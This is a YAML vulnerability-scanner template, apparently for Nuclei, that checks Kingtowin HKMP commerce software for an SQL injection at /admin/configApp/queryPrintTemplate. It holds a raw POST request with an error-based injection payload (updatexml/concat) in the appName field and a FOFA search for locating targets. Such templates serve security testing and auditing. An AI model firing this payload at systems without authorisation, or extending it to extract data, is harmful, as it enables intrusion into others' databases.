id: poc-yaml-kingtowin-queryprinttemplate-sqli
info:
  name: 金斗云HKMP智慧商业软件queryPrintTemplate存在SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: 金斗云-HKMP
    fofa:
      - "body=\"金斗云 HKMP\""
variables:
  t1: "{{rand_int(1000,10000)}}"
  t2: "{{md5(t1)}}"
http:
  - raw:
      - |
        POST /admin/configApp/queryPrintTemplate HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"appId":"hkmp","data":{"adminUserCode":"test1234","adminUserName":"test1234","appName":"' and (updatexml(1,concat(0x7e,(select md5({{t1}})),0x7e),1))=1 and '1'='1","configGroup":"1","mchId":"0001"},"deviceId":"hkmp","mchId":"hkmp","nonce":3621722933,"sign":"hkmp","timestamp":1719306504}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{t2}}"
